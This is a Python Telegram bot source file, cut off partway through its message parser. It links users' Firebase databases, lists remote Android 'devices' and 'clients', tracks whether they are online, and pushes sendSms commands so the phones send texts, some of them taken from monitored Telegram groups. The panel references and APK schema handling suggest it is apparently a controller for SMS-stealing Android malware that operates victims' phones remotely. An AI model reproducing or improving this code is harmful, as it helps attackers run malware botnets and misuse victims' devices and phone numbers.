#!/usr/bin/env python3
print("Starting bot...")

import asyncio
import json
import logging
import os
import signal
import sys
import html
import re
import copy
import threading
import time
import sqlite3
import urllib.parse
from datetime import datetime
from typing import Dict, List, Set, Optional, Tuple

try:
    import google.auth.transport.requests
    from google.oauth2 import service_account
    HAS_GOOGLE_AUTH = True
except ImportError:
    HAS_GOOGLE_AUTH = False

import requests
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    ReplyKeyboardMarkup, KeyboardButton, ChatMemberUpdated
)
from telegram.constants import ParseMode, ChatType, ChatMemberStatus
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    ConversationHandler, ChatMemberHandler, filters, ContextTypes
)

# ===================== CONFIG =====================
# Single source: panel settings.json (fuckwebpanel keys) + env overrides
# telegramAutoBotToken → bot that runs this process
# telegramBotToken → optional alternate token source
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SETTINGS_FILE = os.path.join(BASE_DIR, "settings.json")
DB_FILE = os.path.join(BASE_DIR, "bot_data.db")
OLD_CONFIG_FILE = os.path.join(BASE_DIR, "config.json")
RELOAD_FLAG = os.path.join(BASE_DIR, ".reload_flag")

# Mutated at runtime by reload_runtime_config()
BOT_TOKEN = ""
CHANNEL_USERNAME = ""
CHANNEL_TITLE = ""
CHANNEL_LINK = ""
SMS_FORWARDER_NUMBER = ""
ADMIN_IDS: List[int] = []
_settings_mtime = 0.0
_db_mtime = 0.0


def _load_settings_file() -> dict:
    try:
        if os.path.isfile(SETTINGS_FILE):
            with open(SETTINGS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
            return data if isinstance(data, dict) else {}
    except Exception as e:
        print(f"settings.json load warning: {e}")
    return {}


def _first_str(*vals) -> str:
    for v in vals:
        if v is None:
            continue
        s = str(v).strip()
        if s:
            return s
    return ""


def reload_runtime_config() -> dict:
    """Load panel settings into module globals. Safe to call anytime."""
    global BOT_TOKEN, CHANNEL_USERNAME, CHANNEL_TITLE, CHANNEL_LINK
    global SMS_FORWARDER_NUMBER
    global ADMIN_IDS, _settings_mtime

    cfg = _load_settings_file()
    try:
        _settings_mtime = os.path.getmtime(SETTINGS_FILE) if os.path.isfile(SETTINGS_FILE) else 0.0
    except Exception:
        _settings_mtime = 0.0

    # Bot token priority: env BOT_TOKEN → telegramAutoBotToken → telegramBotToken → legacy bot_token
    BOT_TOKEN = _first_str(
        os.environ.get("BOT_TOKEN"),
        os.environ.get("TELEGRAM_AUTO_BOT_TOKEN"),
        cfg.get("telegramAutoBotToken"),
        cfg.get("telegramBotToken"),
        cfg.get("bot_token"),
    )

    # Optional force-join (empty = off)
    CHANNEL_USERNAME = _first_str(
        os.environ.get("CHANNEL_USERNAME"),
        cfg.get("channel_username"),
        cfg.get("channelUsername"),
    )
    CHANNEL_TITLE = _first_str(os.environ.get("CHANNEL_TITLE"), cfg.get("channel_title"))
    CHANNEL_LINK = _first_str(os.environ.get("CHANNEL_LINK"), cfg.get("channel_link"))

    SMS_FORWARDER_NUMBER = _first_str(
        os.environ.get("SMS_FORWARDER_NUMBER"),
        cfg.get("smsForwarderNumber"),
    )

    admin_raw = _first_str(
        os.environ.get("ADMIN_IDS"),
        cfg.get("admin_ids"),
    )
    if not admin_raw and isinstance(cfg.get("admin_ids"), list):
        admin_raw = ",".join(str(x) for x in cfg.get("admin_ids") or [])
    ADMIN_IDS = [int(x.strip()) for x in admin_raw.split(",") if x.strip().isdigit()]

    return {
        "bot_token_set": bool(BOT_TOKEN),
        "sms_forwarder": SMS_FORWARDER_NUMBER or "",
        "admins": ADMIN_IDS[:],
        "channel": CHANNEL_USERNAME or "",
    }


# Initial load
reload_runtime_config()

DEFAULT_USER_CONFIG = {
    "firebase_list": [],
    "active_firebase_index": 0,
    "device_id": "",
    "sim_index": 0,
    "monitored_groups": [],
    "confirm_reply": False,
    "parsing_enabled": True,
}

MAIN_MENU, ADD_FIREBASE, ADD_PUBLIC_FIREBASE, ADD_PRIVATE_FIREBASE, ADD_FIREBASE_SECRET, ADD_GROUP, AWAITING_SIM, AWAITING_DEVICE = range(8)

# ===================== CACHE =====================
user_cache: Dict[str, dict] = {}
group_index: Dict[str, Set[str]] = {}
banned_set: Set[str] = set()
cache_lock = threading.RLock()

# ===================== LOGGING =====================
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
    handlers=[logging.FileHandler("smsbot.log"), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# ===================== DATABASE =====================
def init_db():
    conn = None
    try:
        conn = sqlite3.connect(DB_FILE)
        cur = conn.cursor()
        cur.execute("""
            CREATE TABLE IF NOT EXISTS users (
                user_id     TEXT PRIMARY KEY,
                config      TEXT NOT NULL,
                updated_at  TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        cur.execute("""
            CREATE TABLE IF NOT EXISTS banned (
                user_id     TEXT PRIMARY KEY,
                banned_at   TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        # WAL mode: allows concurrent reads during writes (prevents DB lock errors)
        cur.execute("PRAGMA journal_mode=WAL")
        conn.commit()
    except Exception as e:
        logger.error(f"init_db error: {e}")
    finally:
        if conn:
            conn.close()

def migrate_from_json():
    if not os.path.exists(OLD_CONFIG_FILE):
        return
    try:
        with open(OLD_CONFIG_FILE, "r", encoding="utf-8") as f:
            old = json.load(f)
        users = old.get("users", {})
        if not users:
            return
        conn = sqlite3.connect(DB_FILE)
        cur = conn.cursor()
        for uid, cfg in users.items():
            groups = []
            for g in cfg.get("monitored_groups", []):
                if isinstance(g, str):
                    groups.append({"id": g, "title": g})
                else:
                    groups.append(g)
            cfg["monitored_groups"] = groups
            cur.execute(
                "INSERT OR REPLACE INTO users (user_id, config, updated_at) VALUES (?, ?, CURRENT_TIMESTAMP)",
                (str(uid), json.dumps(cfg, ensure_ascii=False))
            )
        conn.commit()
        conn.close()
        os.rename(OLD_CONFIG_FILE, OLD_CONFIG_FILE + ".migrated")
        logger.info(f"✅ Migrated {len(users)} users")
    except Exception as e:
        logger.error(f"Migration failed: {e}")

def load_cache():
    global user_cache, group_index, banned_set
    with cache_lock:
        user_cache.clear()
        group_index.clear()
        banned_set.clear()

        conn = None
        try:
            conn = sqlite3.connect(DB_FILE)
            cur = conn.cursor()

            cur.execute("SELECT user_id, config FROM users")
            for uid, conf in cur.fetchall():
                try:
                    cfg = json.loads(conf)
                    # Ensure all default keys exist (in case old DB rows are missing keys)
                    for k, v in DEFAULT_USER_CONFIG.items():
                        if k not in cfg:
                            cfg[k] = copy.deepcopy(v)
                    # Normalize firebase_list entries
                    firebase_list = []
                    for fb in cfg.get("firebase_list", []):
                        if isinstance(fb, str):
                            firebase_list.append({"url": fb, "secret": "", "service_account": None})
                        elif isinstance(fb, dict):
                            fb.setdefault("secret", "")
                            fb.setdefault("service_account", None)
                            firebase_list.append(fb)
                    cfg["firebase_list"] = firebase_list

                    groups = []
                    for g in cfg.get("monitored_groups", []):
                        if isinstance(g, str):
                            groups.append({"id": str(g), "title": str(g)})
                        else:
                            g["id"] = str(g["id"])
                            groups.append(g)
                    cfg["monitored_groups"] = groups
                    user_cache[uid] = cfg
                    for g in groups:
                        gid = str(g["id"])
                        group_index.setdefault(gid, set()).add(uid)
                except Exception as e:
                    logger.warning(f"Skipping corrupt user row {uid}: {e}")
                    continue

            cur.execute("SELECT user_id FROM banned")
            for (uid,) in cur.fetchall():
                banned_set.add(uid)
        except Exception as e:
            logger.error(f"load_cache DB error: {e}")
        finally:
            if conn:
                conn.close()

        logger.info(f"✅ Cache loaded: {len(user_cache)} users | {len(group_index)} groups")

def get_user_config(user_id: int) -> dict:
    uid = str(user_id)
    with cache_lock:
        if uid in user_cache:
            # Return a deep copy so callers can't accidentally mutate the cache
            # without calling save_user_config()
            return copy.deepcopy(user_cache[uid])
        # New user — create default config
        cfg = copy.deepcopy(DEFAULT_USER_CONFIG)
        user_cache[uid] = copy.deepcopy(cfg)
    # Save to DB outside lock to avoid deadlock
    _save_to_db(uid, cfg)
    logger.info(f"🆕 New user registered: {uid}")
    return cfg

def save_user_config(user_id: int, cfg: dict):
    uid = str(user_id)
    with cache_lock:
        old_ids = {str(g["id"]) for g in user_cache.get(uid, {}).get("monitored_groups", [])}
        new_ids = {str(g["id"]) for g in cfg.get("monitored_groups", [])}

        for g in cfg.get("monitored_groups", []):
            g["id"] = str(g["id"])

        # Store a deep copy so external mutations don't affect the cache
        user_cache[uid] = copy.deepcopy(cfg)

        # Rebuild group_index for this user
        for gid in old_ids - new_ids:
            if gid in group_index:
                group_index[gid].discard(uid)
                if not group_index[gid]:
                    del group_index[gid]

        for gid in new_ids - old_ids:
            group_index.setdefault(gid, set()).add(uid)

        logger.info(f"💾 Saved config for {uid} | groups={list(new_ids)} | device={cfg.get('device_id')} | parsing={cfg.get('parsing_enabled')}")

    _save_to_db(uid, cfg)

def _save_to_db(uid: str, cfg: dict):
    try:
        conn = sqlite3.connect(DB_FILE, timeout=10)
        cur = conn.cursor()
        cur.execute(
            "INSERT OR REPLACE INTO users (user_id, config, updated_at) VALUES (?, ?, CURRENT_TIMESTAMP)",
            (uid, json.dumps(cfg, ensure_ascii=False))
        )
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"DB save failed: {e}")

def is_banned(user_id: int) -> bool:
    return str(user_id) in banned_set

def ban_user(user_id: int):
    uid = str(user_id)
    with cache_lock:
        banned_set.add(uid)
    try:
        conn = sqlite3.connect(DB_FILE)
        cur = conn.cursor()
        cur.execute("INSERT OR REPLACE INTO banned (user_id) VALUES (?)", (uid,))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Ban error: {e}")

def unban_user(user_id: int):
    uid = str(user_id)
    with cache_lock:
        banned_set.discard(uid)
    try:
        conn = sqlite3.connect(DB_FILE)
        cur = conn.cursor()
        cur.execute("DELETE FROM banned WHERE user_id = ?", (uid,))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Unban error: {e}")

def get_banned_users() -> List[str]:
    with cache_lock:
        return sorted(list(banned_set))

def delete_user_data(user_id: int):
    uid = str(user_id)
    with cache_lock:
        cfg = user_cache.pop(uid, None)
        if cfg:
            for g in cfg.get("monitored_groups", []):
                gid = str(g["id"])
                if gid in group_index:
                    group_index[gid].discard(uid)
                    if not group_index[gid]:
                        del group_index[gid]
    try:
        conn = sqlite3.connect(DB_FILE)
        cur = conn.cursor()
        cur.execute("DELETE FROM users WHERE user_id = ?", (uid,))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Delete error: {e}")

def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS

def get_stats():
    with cache_lock:
        total_users = len(user_cache)
        total_fb = total_groups = active = 0
        for cfg in user_cache.values():
            total_fb += len(cfg.get("firebase_list", []))
            total_groups += len(cfg.get("monitored_groups", []))
            if cfg.get("parsing_enabled", True) and cfg.get("device_id"):
                active += 1
        return total_users, total_fb, total_groups, active, len(banned_set)

def remove_group_from_all_users(group_id: str):
    group_id = str(group_id)
    to_save: list[tuple[str, dict]] = []
    with cache_lock:
        user_ids = list(group_index.get(group_id, set()))
        for uid in user_ids:
            cfg = user_cache.get(uid)
            if not cfg:
                continue
            cfg["monitored_groups"] = [g for g in cfg.get("monitored_groups", []) if str(g["id"]) != group_id]
            user_cache[uid] = cfg
            to_save.append((uid, copy.deepcopy(cfg)))
        group_index.pop(group_id, None)
    # Save to DB outside lock to prevent deadlock
    for uid, cfg in to_save:
        _save_to_db(uid, cfg)
    logger.info(f"🧹 Removed dead group {group_id} from {len(user_ids)} users")

def update_group_title(group_id: str, new_title: str):
    group_id = str(group_id)
    to_save: list[tuple[str, dict]] = []
    with cache_lock:
        user_ids = list(group_index.get(group_id, set()))
        for uid in user_ids:
            cfg = user_cache.get(uid)
            if not cfg:
                continue
            changed = False
            for g in cfg.get("monitored_groups", []):
                if str(g["id"]) == group_id and g.get("title") != new_title:
                    g["title"] = new_title
                    changed = True
            if changed:
                user_cache[uid] = cfg
                to_save.append((uid, copy.deepcopy(cfg)))
    # Save to DB outside lock to prevent deadlock
    for uid, cfg in to_save:
        _save_to_db(uid, cfg)
    if to_save:
        logger.info(f"📝 Updated title of {group_id} → '{new_title}' for {len(to_save)} users")

# ===================== HELPERS =====================
FIREBASE_SCOPES = [
    "https://www.googleapis.com/auth/userinfo.email",
    "https://www.googleapis.com/auth/firebase.database"
]

_token_cache: Dict[str, Tuple[str, float]] = {}  # client_email -> (token, expiry_ts)

def get_service_account_token(sa_info: dict) -> Optional[str]:
    if not HAS_GOOGLE_AUTH or not isinstance(sa_info, dict):
        return None
    try:
        client_email = sa_info.get("client_email", "")
        if not client_email:
            return None
        now = time.time()
        if client_email in _token_cache:
            token, expiry = _token_cache[client_email]
            if now < expiry - 60:
                return token
        creds = service_account.Credentials.from_service_account_info(
            sa_info, scopes=FIREBASE_SCOPES
        )
        auth_req = google.auth.transport.requests.Request()
        creds.refresh(auth_req)
        if creds.token:
            expiry = creds.expiry.timestamp() if creds.expiry else (now + 3500)
            _token_cache[client_email] = (creds.token, expiry)
            return creds.token
    except Exception as e:
        logger.error(f"Error refreshing service account token: {e}")
    return None

async def extract_json_from_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> Tuple[Optional[dict], Optional[str]]:
    """
    Extracts and parses JSON from uploaded .json document or raw JSON text.
    """
    msg = update.message
    if not msg:
        return None, None

    if msg.document:
        try:
            doc = msg.document
            file = await context.bot.get_file(doc.file_id)
            content_bytes = await file.download_as_bytearray()
            content_str = content_bytes.decode("utf-8", errors="ignore").strip()
            data = json.loads(content_str)
            return data, None
        except json.JSONDecodeError:
            return None, "Uploaded file is not valid JSON."
        except Exception as e:
            return None, f"Failed to read uploaded file: {e}"

    text = (msg.text or "").strip()
    if text.startswith("{") and text.endswith("}"):
        try:
            data = json.loads(text)
            return data, None
        except json.JSONDecodeError:
            return None, "Invalid JSON text format."

    return None, None

def parse_service_account_dict(data: dict) -> Tuple[bool, Optional[str], Optional[str], Optional[str]]:
    """
    Validates if dict is Firebase Service Account JSON or google-services.json.
    Returns (is_valid, project_id, default_url, error_message)
    """
    if not isinstance(data, dict):
        return False, None, None, "Invalid JSON data."

    # Detect google-services.json (Android app config)
    if "project_info" in data and "client" in data:
        proj_info = data.get("project_info", {})
        fb_url = proj_info.get("firebase_url") or f"https://{proj_info.get('project_id', '')}-default-rtdb.firebaseio.com"
        return False, proj_info.get("project_id"), fb_url, (
            "⚠️ Ye `google-services.json` file hai (Android app config).\n\n"
            "Private Database access ke liye **Firebase Admin SDK Service Account** JSON file chahiye:\n"
            "1. Firebase Console kholein ➔ **Project Settings (⚙️)**\n"
            "2. **Service accounts** tab par jayein\n"
            "3. **Generate new private key** button dabayein\n"
            "4. Jo `.json` file download hogi, wo yahan upload karein!"
        )

    # Check for Firebase Service Account Key
    if data.get("type") == "service_account" and data.get("private_key"):
        project_id = data.get("project_id")
        if not project_id:
            return False, None, None, "Missing `project_id` in Service Account JSON."
        default_url = f"https://{project_id}-default-rtdb.firebaseio.com"
        return True, project_id, default_url, None

    return False, None, None, "Ye valid Firebase Service Account JSON key nahi hai."

def normalize_firebase_base(url: str) -> str:
    """Clean RTDB root URL (strip ?query, trailing /.json, accidental /clients etc)."""
    url = (url or "").strip()
    if not url:
        return ""
    try:
        parsed = urllib.parse.urlparse(url)
        if not (parsed.scheme and parsed.netloc):
            return url.rstrip("/")
        path = (parsed.path or "").rstrip("/")
        if path.endswith(".json"):
            path = path[:-5].rstrip("/")
        # users sometimes paste full node paths
        for leaf in (
            "/clients",
            "/devices",
            "/messages",
            "/deviceMessages",
            "/.json",
        ):
            if path.endswith(leaf):
                path = path[: -len(leaf)].rstrip("/")
        return f"{parsed.scheme}://{parsed.netloc}{path}".rstrip("/")
    except Exception:
        return url.rstrip("/")


def parse_firebase_input(text: str) -> Tuple[str, str]:
    """
    Extract base URL and secret if input has ?auth= / ?access_token= query param.
    """
    text = (text or "").strip()
    try:
        parsed = urllib.parse.urlparse(text)
        if parsed.scheme and parsed.netloc:
            qs = urllib.parse.parse_qs(parsed.query)
            secret = (
                (qs.get("auth") or qs.get("access_token") or [""])[0] or ""
            ).strip()
            clean_base = normalize_firebase_base(
                f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            )
            return clean_base, secret
    except Exception:
        pass
    return normalize_firebase_base(text), ""


def clean_database_secret(raw: str) -> str:
    """Normalize pasted Database Secret (quotes / whitespace / accidental labels)."""
    s = (raw or "").strip()
    if not s:
        return ""
    # strip wrapping quotes
    if (s.startswith('"') and s.endswith('"')) or (s.startswith("'") and s.endswith("'")):
        s = s[1:-1].strip()
    # user sometimes pastes "auth=XXXX" or full URL with secret
    if s.lower().startswith("auth="):
        s = s.split("=", 1)[1].strip()
    if s.startswith("http://") or s.startswith("https://"):
        _, sec = parse_firebase_input(s)
        if sec:
            return sec
    # multi-line paste → first non-empty line
    if "\n" in s:
        for line in s.splitlines():
            line = line.strip()
            if line and not line.lower().startswith(("database", "secret", "http")):
                s = line
                break
    return s.strip()


def validate_firebase_url(url: str) -> bool:
    u = (url or "").strip()
    if not u.startswith(("https://", "http://")):
        return False
    # must look like firebase RTDB host (loose check)
    host = ""
    try:
        host = (urllib.parse.urlparse(u).netloc or "").lower()
    except Exception:
        return True
    if not host:
        return False
    return True


def test_firebase_auth(
    base_url: str,
    secret: str = "",
    service_account: Optional[dict] = None,
) -> Tuple[bool, str]:
    """
    Live RTDB auth check before saving private Firebase.
    Returns (ok, human_message).
    """
    base = normalize_firebase_base(base_url)
    if not base:
        return False, "Invalid Firebase URL"
    headers: dict = {}
    params: dict = {}
    sa = service_account if isinstance(service_account, dict) else None
    if sa and sa.get("private_key"):
        token = get_service_account_token(sa)
        if not token:
            return False, "Service Account se OAuth token nahi bana (google-auth / key check karein)"
        params["access_token"] = token
        headers["Authorization"] = f"Bearer {token}"
    else:
        sec = clean_database_secret(secret)
        if not sec:
            return False, "Database Secret empty hai"
        if sec.startswith("AIza"):
            return False, (
                "Ye Web API Key (AIza…) lag rahi hai — isse RTDB private access nahi hota. "
                "Firebase Console ➔ Project Settings ➔ Service accounts ➔ Database secrets "
                "se Database Secret paste karein, ya Service Account .json upload karein."
            )
        params["auth"] = sec
    try:
        r = requests.get(
            f"{base}/.json",
            params=params,
            headers=headers,
            timeout=15,
        )
        if r.status_code == 200:
            return True, "Connected"
        if r.status_code in (401, 403):
            return False, (
                f"Permission denied (HTTP {r.status_code}) — Database Secret / Service Account "
                "galat hai, ya is project se match nahi karta."
            )
        if r.status_code == 404:
            return False, "Firebase URL not found (404) — URL check karein"
        return False, f"HTTP {r.status_code}: {(r.text or '')[:140]}"
    except requests.exceptions.Timeout:
        return False, "Firebase timeout — dubara try karein"
    except requests.exceptions.ConnectionError:
        return False, "Firebase unreachable — URL check karein"
    except Exception as e:
        return False, f"Connection error: {e}"

def validate_phone_number(phone: str) -> bool:
    cleaned = phone.strip()
    if not cleaned:
        return False
    if re.match(r'^[\d]{4,}$', cleaned):
        return True
    return bool(re.match(r'^[\d\+\-\(\)\s]{5,}$', cleaned))

def sanitize_input(text: str) -> str:
    return html.escape(text)

def get_group_title(cfg: dict, gid: str) -> str:
    gid = str(gid)
    for g in cfg.get("monitored_groups", []):
        if str(g["id"]) == gid:
            return g.get("title") or gid
    return gid

# ===================== FIREBASE =====================
def fetch_json(url: str, headers: dict = None, retries: int = 2, timeout: int = 5) -> dict:
    for attempt in range(retries + 1):
        try:
            r = requests.get(url, headers=headers or {}, timeout=timeout)
            if r.status_code == 200:
                txt = r.text.strip()
                return {} if txt == "null" else r.json()
            if r.status_code >= 500 and attempt < retries:
                time.sleep(0.4)
                continue
            return {}
        except requests.exceptions.Timeout:
            if attempt == retries:
                logger.warning(f"Timeout fetching {url}")
            else:
                time.sleep(0.3)
        except requests.exceptions.ConnectionError:
            if attempt == retries:
                logger.warning(f"Connection error: {url}")
            else:
                time.sleep(0.3)
        except Exception as e:
            logger.error(f"Fetch error: {e}")
            break
    return {}

def get_active_firebase_entry(user_cfg: dict) -> dict:
    lst = user_cfg.get("firebase_list", [])
    idx = user_cfg.get("active_firebase_index", 0)
    if 0 <= idx < len(lst):
        item = lst[idx]
        if isinstance(item, str):
            return {"url": item, "secret": "", "service_account": None}
        return item
    return {}

def get_active_firebase_url(user_cfg: dict) -> str:
    return get_active_firebase_entry(user_cfg).get("url", "")

def get_active_firebase_secret(user_cfg: dict) -> str:
    return get_active_firebase_entry(user_cfg).get("secret", "")

def get_firebase_request_params(user_cfg: dict, path: str) -> Tuple[str, dict]:
    """
    Returns (full_url, headers).
    - Service Account → ?access_token= + Bearer
    - Database Secret → ?auth= (URL-encoded)
    """
    entry = get_active_firebase_entry(user_cfg)
    base = normalize_firebase_base(entry.get("url", "") or "")
    if not base:
        return "", {}

    clean_path = path.lstrip("/")
    url = f"{base}/{clean_path}"
    headers: dict = {}
    params: dict = {}

    sa_info = entry.get("service_account")
    if sa_info and isinstance(sa_info, dict) and sa_info.get("private_key"):
        token = get_service_account_token(sa_info)
        if token:
            params["access_token"] = token
            headers["Authorization"] = f"Bearer {token}"
    else:
        secret = clean_database_secret(entry.get("secret", "") or "")
        if secret and not secret.startswith("AIza"):
            params["auth"] = secret

    if params:
        sep = "&" if "?" in url else "?"
        url = f"{url}{sep}{urllib.parse.urlencode(params)}"

    return url, headers

def build_firebase_url(user_cfg: dict, path: str) -> str:
    url, _ = get_firebase_request_params(user_cfg, path)
    return url

def _to_ms_ts(val) -> Optional[float]:
    """Normalize seconds/ms timestamps to milliseconds."""
    try:
        fv = float(val)
    except Exception:
        return None
    # seconds since epoch (~1e9–1e10) → ms
    if fv < 1e12:
        fv *= 1000.0
    return fv


def is_device_online(data: dict, now_ms: float = None) -> bool:
    """
    Broad online detection across different APK/Firebase schemas:
    - isOnline / online / connected booleans
    - status: True | 1 | "online" | "active" | "alive" | "on"
    - lastOnlineAt / last_seen / lastSeen (within 15 min)
    - heartbeat.timestamp or heartbeat dict with status alive (within 15 min)
    """
    if not isinstance(data, dict):
        return False
    if now_ms is None:
        now_ms = time.time() * 1000

    # truthy checks (working.py style) — not only `is True`
    if data.get("isOnline") or data.get("online") or data.get("connected"):
        return True

    st = data.get("status")
    if st is True or st == 1 or st is False:
        # explicit False/True
        return st is True or st == 1
    if isinstance(st, str) and st.strip().lower() in (
        "online", "active", "alive", "on", "true", "1", "connected"
    ):
        return True
    if isinstance(st, (int, float)) and st != 0:
        return True

    # timestamp-based freshness (15 minutes)
    window = 900_000.0
    for key in (
        "lastOnlineAt", "last_seen", "lastSeen", "lastSeenAt",
        "updatedAt", "last_update", "lastUpdate", "timestamp", "ts",
        "last_heartbeat", "lastHeartbeat",
    ):
        ms = _to_ms_ts(data.get(key))
        if ms is not None and (now_ms - ms) < window and (now_ms - ms) > -60_000:
            return True

    hb = data.get("heartbeat")
    if isinstance(hb, dict):
        hb_st = str(hb.get("status") or "").lower()
        ms = _to_ms_ts(hb.get("timestamp") or hb.get("ts") or hb.get("time"))
        if ms is not None and (now_ms - ms) < window:
            return True
        if hb_st in ("alive", "online", "active") and ms is not None and (now_ms - ms) < window * 2:
            return True
    elif hb is not None:
        ms = _to_ms_ts(hb)
        if ms is not None and (now_ms - ms) < window:
            return True

    return False


def device_display_meta(data: dict) -> Tuple[str, str, bool]:
    """Return (model_label, phone_label, is_online) for UI."""
    if not isinstance(data, dict):
        return "", "", False
    model = (
        data.get("deviceModel")
        or data.get("modelName")
        or data.get("model")
        or data.get("phone_model")
        or data.get("device_name")
        or data.get("name")
        or ""
    )
    phone = (
        data.get("phoneNumber")
        or data.get("mobNo")
        or data.get("mobile")
        or data.get("number")
        or data.get("msisdn")
        or ""
    )
    phone = str(phone).strip()
    model = str(model).strip()
    return model, phone, is_device_online(data)


def fetch_all_devices(user_cfg: dict) -> Dict[str, dict]:
    """
    working.py uses clients.json first (main source for most panels).
    Also merge devices.json when present (some projects use that path).
    clients wins on field conflicts.
    """
    merged: Dict[str, dict] = {}

    # clients FIRST (working.py), then devices
    for path in ("clients.json", "devices.json"):
        url, headers = get_firebase_request_params(user_cfg, path)
        if not url:
            continue
        blob = fetch_json(url, headers=headers, retries=2, timeout=20)
        if not isinstance(blob, dict) or not blob:
            logger.info(f"Firebase {path}: empty/null")
            continue
        count = 0
        for did, data in blob.items():
            if data is None or not isinstance(data, dict):
                continue
            if str(did).startswith(".") or str(did) in ("webhookEvent", "actions", "config"):
                continue
            did_s = str(did)
            if did_s in merged and isinstance(merged[did_s], dict):
                base = dict(merged[did_s])
                base.update({k: v for k, v in data.items() if v is not None})
                merged[did_s] = base
            else:
                merged[did_s] = data
            count += 1
        logger.info(f"Firebase {path}: {count} device nodes")

    return merged


def get_online_devices(user_cfg: dict) -> Dict[str, dict]:
    devices = fetch_all_devices(user_cfg)
    if not devices:
        return {}
    now_ms = time.time() * 1000
    online = {}
    for did, data in devices.items():
        if is_device_online(data, now_ms):
            online[str(did)] = data
    logger.info(f"📱 devices total={len(devices)} online={len(online)}")
    return online


def get_all_devices(user_cfg: dict) -> Dict[str, dict]:
    """All devices (online+offline) for selection UI fallback."""
    return fetch_all_devices(user_cfg)


def get_device_data(user_cfg: dict, did: str) -> dict:
    did = str(did)
    # working.py: clients/{id} first
    for path in (f"clients/{did}.json", f"devices/{did}.json"):
        url, headers = get_firebase_request_params(user_cfg, path)
        data = fetch_json(url, headers=headers, timeout=10) if url else {}
        if data and isinstance(data, dict):
            return data
    return {}

def diagnose_failure(user_cfg: dict) -> str:
    url, headers = get_firebase_request_params(user_cfg, ".json")
    if not url:
        return "No active Firebase configured"
    try:
        r = requests.get(url, headers=headers, timeout=4)
        if r.status_code in (401, 403):
            return "Firebase Unauthorized / Permission Denied (Check Service Account / Secret)"
        if r.status_code >= 400:
            return f"Firebase error (HTTP {r.status_code})"
    except requests.exceptions.Timeout:
        return "Firebase is slow / timed out"
    except requests.exceptions.ConnectionError:
        return "Firebase is unreachable"
    except Exception:
        return "Firebase connection problem"

    did = user_cfg.get("device_id")
    if not did:
        return "No device selected"

    data = get_device_data(user_cfg, did)
    if not data:
        return "Device not found in Firebase (clients/devices)"

    if not is_device_online(data):
        return "Device is offline"
    return "Unknown error (check device / SIM)"

def _send_sms_sync(user_cfg: dict, to: str, msg: str) -> Tuple[bool, str]:
    """
    working.py path first: clients/{id}/webhookEvent/sendSms.json
    then devices/* fallbacks (newer APKs).
    """
    did = user_cfg.get("device_id", "")
    if not did:
        return False, "No device selected"

    sim = user_cfg.get("sim_index", 0)
    now_ms = int(time.time() * 1000)
    payload_simple = {
        "from": sim,
        "to": to.strip(),
        "message": msg.strip(),
        "isSended": False,
    }
    payload_cmd = {
        "cmdId": now_ms,
        "from": sim,
        "to": to.strip(),
        "message": msg.strip(),
        "isSended": False,
        "sendOk": False,
    }

    # Order matches working.py first, then extended paths
    attempts = [
        (f"clients/{did}/webhookEvent/sendSms.json", payload_simple),
        (f"devices/{did}/webhookEvent/sendSms.json", payload_simple),
        (f"devices/{did}/actions/sendSms.json", payload_cmd),
        (f"clients/{did}/actions/sendSms.json", payload_cmd),
    ]

    last_err = "No active Firebase"
    for path, payload in attempts:
        url, headers = get_firebase_request_params(user_cfg, path)
        if not url:
            continue
        try:
            r = requests.put(url, headers=headers, json=payload, timeout=8)
            if 200 <= r.status_code < 300:
                logger.info(f"📤 SMS OK via {path} → {to}")
                return True, "OK"
            last_err = f"HTTP {r.status_code} @ {path}"
            if r.status_code in (401, 403):
                return False, "Firebase Permission Denied (Auth/Key Error)"
            logger.warning(f"SMS put failed {path}: {r.status_code} {r.text[:80]}")
        except requests.exceptions.Timeout:
            last_err = "Timeout"
            logger.warning(f"SMS timeout {path}")
        except requests.exceptions.ConnectionError:
            last_err = "Connection failed"
        except Exception as e:
            last_err = str(e)[:80]
            logger.warning(f"SMS error {path}: {e}")

    return False, last_err

async def send_sms_async(user_cfg: dict, to: str, msg: str) -> Tuple[bool, str]:
    loop = asyncio.get_running_loop()
    return await loop.run_in_executor(None, _send_sms_sync, user_cfg, to, msg)

# ===================== PARSER =====================
def parse_message(text: str):
    lines = [l.strip() for l in text.split("\n") if l.strip()]

    m = next((l for l in lines if l.startswith("🏷️ MESSAGE")), None)
    r = next((l for l in lines if l.startswith("🏷️ RECIPIENT")), None)
    if m and r:
        return r.split(":", 1)[-1].strip(), m.split(":", 1)[-1].strip()

    to_num = msg = None
    for i, l in enumerate(lines):
        if l.startswith("📱") and "To:" in l:
            p = l.split("To:", 1)
            to_num = p[1].strip() if len(p) > 1 and p[1].strip() else None
        if l.startswith("💬") and "Full Message:" in l and i + 1 < len(lines):
            msg = lines[i + 1].strip()
    if to_num and msg:
        return to_num, msg

    to_num = msg = None
    for i, l in enumerate(lines):
        if l.startswith("📍") and "To:" in l and i + 1 < len(lines):
            to_num = lines[i + 1].strip()
        if l.startswith("💬") and "Message:" in l and i + 1 < len(lines):
            msg = lines[i + 1].strip()
    if to_num and msg:
        return to_num, msg

    to_num = msg = None
    for i, l in enumerate(lines):
        if l.startswith("To:"):
            p = l.split("To:", 1)
            to_num = p[1].strip() if len(p) > 1 and p[1].strip() else (lines[i + 1].strip() if i + 1 < len(lines) else None)
        if l.startswith("Message:"):
            p = l.split("Message:", 1)
            msg = p[1].strip() if len(p) > 1 and p[1].strip() else (lines[i + 1].strip() if i + 1 < len(lines) else None)
    if to_num and msg:
        return to_num, msg

    to_num = msg = None
    for i, l in enumerate(lines):
        if l.startswith("📱") and "Receiver" in l and i + 1 < len(lines):
            to_num = lines[i + 1].strip()
        if l.startswith("🔑") and "Message" in l and i + 1 < len(lines):
            msg = lines[i + 1].strip()
    if to_num and msg:
